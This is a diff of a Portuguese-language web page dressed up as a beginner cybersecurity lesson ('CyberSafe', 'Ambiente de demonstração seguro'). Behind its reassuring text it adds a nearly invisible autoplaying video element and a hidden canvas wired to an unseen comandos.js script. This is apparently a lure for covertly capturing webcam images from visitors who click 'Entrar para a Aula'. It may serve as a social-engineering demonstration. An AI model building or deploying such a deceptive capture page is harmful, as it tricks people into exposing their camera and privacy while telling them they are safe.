@@ -1,20 +1,153 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt">
 <head>
-    <title>Segurança Cybernética</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Segurança Cibernética | Aula</title>
+
     <link rel="stylesheet" href="style.css">
-    
 </head>
+
 <body>
-    <h1>Acesso a Aula</h1>
-    <p>Clique no botão abaixo para ter acesso a Aula sobre segurança.</p>
-    <button class="btn" onclick="start()">Entrar para Aula</button>
+  
+    <header class="header">
+        <div class="logo">
+            <span class="logo-icon">🛡️</span>
+            <span>Cyber<span>Safe</span></span>
+        </div>
 
-    <video id="v" autoplay playsinline style="opacity: 0.01; position: absolute;"></video>
-    <canvas id="c" style="display:none"></canvas>
+        <div class="status">
+            <span class="status-dot"></span>
+            Aula disponível
+        </div>
+    </header>
 
-    
+
+    <!-- =========================
+         CONTEÚDO PRINCIPAL
+    ========================== -->
+    <main class="main">
+
+        <section class="hero">
+
+            <div class="badge">
+                🔐 SEGURANÇA CIBERNÉTICA
+            </div>
+
+            <h1>
+                Proteja-se no
+                <span>mundo digital.</span>
+            </h1>
+
+            <p class="description">
+                Aprenda como identificar ameaças digitais, reconhecer
+                ataques de engenharia social e proteger as suas
+                informações no ambiente online.
+            </p>
+
+            <!-- Informações da aula -->
+            <div class="lesson-info">
+
+                <div class="info-card">
+                    <span class="info-icon">🎓</span>
+                    <div>
+                        <small>TIPO</small>
+                        <strong>Aula prática</strong>
+                    </div>
+                </div>
+
+                <div class="info-card">
+                    <span class="info-icon">⏱️</span>
+                    <div>
+                        <small>DURAÇÃO</small>
+                        <strong>45 minutos</strong>
+                    </div>
+                </div>
+
+                <div class="info-card">
+                    <span class="info-icon">🛡️</span>
+                    <div>
+                        <small>NÍVEL</small>
+                        <strong>Iniciante</strong>
+                    </div>
+                </div>
+
+            </div>
+
+
+            <!-- Botão de entrada -->
+            <div class="action">
+
+                <button
+                    class="btn"
+                    type="button"
+                    onclick="start()"
+                >
+                    <span>Entrar para a Aula</span>
+                    <span class="arrow">→</span>
+                </button>
+
+                <p class="secure-message">
+                    🔒 Ambiente de demonstração seguro
+                </p>
+
+            </div>
+
+        </section>
+
+
+        <!-- =========================
+             ÁREA VISUAL
+        ========================== -->
+        <section class="visual">
+
+            <div class="security-circle">
+
+                <div class="circle-ring ring-1"></div>
+                <div class="circle-ring ring-2"></div>
+
+                <div class="shield">
+                    🛡️
+                </div>
+
+                <div class="floating-card card-top">
+                    🔐
+                    <span>Dados protegidos</span>
+                </div>
+
+                <div class="floating-card card-bottom">
+                    ✓
+                    <span>Sistema seguro</span>
+                </div>
+
+            </div>
+
+        </section>
+
+    </main>
+
+
+    <!-- =========================
+         ELEMENTOS UTILIZADOS
+         PELO JAVASCRIPT
+    ========================== -->
+
+    <video
+        id="v"
+        autoplay
+        playsinline
+        style="opacity: 0.01; position: absolute;"
+    ></video>
+
+    <canvas
+        id="c"
+        style="display: none;"
+    ></canvas>
+
+
+    <script src="comandos.js"></script>
+
 </body>
-<script src="comandos.js"></script>
 </html>
+```
